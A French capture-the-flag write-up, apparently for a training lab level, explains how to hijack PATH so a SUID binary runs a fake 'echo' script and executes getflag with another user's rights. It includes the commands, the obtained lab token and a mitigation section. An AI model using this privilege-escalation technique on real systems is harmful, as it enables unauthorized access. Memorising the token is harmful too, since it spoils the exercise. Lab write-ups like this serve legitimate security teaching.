# Level03 — Explications

## Objectif
Exploiter un binaire SUID appartenant à `flag03` pour exécuter `getflag` sous
son identité et obtenir le token (= mot de passe de `level04`).

## Étapes

### 1. Repérer le binaire
```bash
ls -la
# -rwsr-sr-x 1 flag03 level03 8627 level03
```

Points clés de la ligne :
- propriétaire = **flag03** → le pont vers le flag suivant
- les `s` dans `rwsr-sr-x` = bits **SUID + SGID** → le programme s'exécute avec
  les droits de **flag03**, quel que soit celui qui le lance
- `r-x` pour "others" → level03 peut l'exécuter

### 2. Observer le comportement
```bash
./level03
# Exploit me
```

Le programme affiche juste "Exploit me". Il faut comprendre comment.

### 3. Analyser le binaire (sans gdb)
```bash
strings level03
```

Lignes importantes :
```
setresuid / setresgid   → le programme prend les droits de flag03
system                  → il exécute une commande via un shell
/usr/bin/env echo Exploit me   → la commande exécutée
```

**La faille est là.** Le programme appelle `system("/usr/bin/env echo …")` :
- `system()` lance un shell qui exécute la commande.
- `/usr/bin/env` cherche le programme `echo` dans les dossiers de la variable
  **`PATH`** et lance le **premier** trouvé.
- `echo` est appelé **sans chemin absolu** (pas `/bin/echo`) → c'est le `PATH`
  qui décide quel `echo` est exécuté, et le `PATH` est contrôlé par l'utilisateur.

### 4. Construire l'exploit (manipulation du PATH)
Idée : fabriquer un faux `echo` qui lance `getflag`, et forcer `env` à le
trouver avant le vrai en plaçant son dossier en tête du `PATH`. Comme le binaire
tourne en tant que flag03, le faux `echo` tournera aussi en tant que flag03.

Créer le faux `echo` dans `/tmp` (dossier où on peut écrire) :
```bash
echo '#!/bin/sh
getflag' > /tmp/echo
chmod +x /tmp/echo
```

- `#!/bin/sh` : indique que le fichier est un script shell
- `getflag` : la commande qu'on veut exécuter en tant que flag03
- `chmod +x` : rend le script exécutable

Mettre `/tmp` en **premier** dans le PATH :
```bash
export PATH=/tmp:$PATH
```

- `/tmp` est placé devant → `env` y cherchera `echo` en premier
- `:$PATH` conserve l'ancien PATH derrière (ne jamais le remplacer, sinon les
  commandes système deviennent introuvables)

### 5. Lancer l'exploit
```bash
cd ~
./level03
# Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

Token obtenu : `qi0maab88jeaj46qoumi7maus`

C'est le **flag de level03** et le **mot de passe de level04**.

## Résumé
binaire SUID flag03 → `strings` révèle `system("/usr/bin/env echo …")`
→ `echo` sans chemin absolu → faux `echo` dans `/tmp` + `/tmp` en tête de `$PATH`
→ exécution de `getflag` en tant que flag03

## Analyse de la faille

**Quelle était la faille ?**
Un programme SUID (exécuté avec les droits de flag03) appelait une commande
externe (`echo`) **sans chemin absolu**, via `system()` + `env`. La recherche de
`echo` dépendait donc du `PATH`, que l'utilisateur contrôle. En plaçant un faux
`echo` en tête de `PATH`, on fait exécuter son propre code avec les droits de
flag03. C'est une **attaque par manipulation du PATH**.

**Pourquoi c'est un problème ?**
- Un binaire privilégié (SUID) ne doit jamais faire confiance à l'environnement
  de l'utilisateur, car celui-ci est entièrement contrôlable par l'attaquant.
- Appeler une commande par son nom seul laisse l'utilisateur décider quel
  exécutable sera réellement lancé.

**Comment l'empêcher ?**
- Appeler les commandes par leur **chemin absolu** (`/bin/echo`) au lieu de leur
  nom seul.
- Mieux : éviter `system()` dans un programme SUID ; préférer `execve()` avec un
  chemin absolu et un environnement maîtrisé (PATH réinitialisé).
- Nettoyer / fixer les variables d'environnement sensibles (`PATH`) en début de
  programme.
- N'accorder le bit SUID qu'en cas de réelle nécessité (moindre privilège).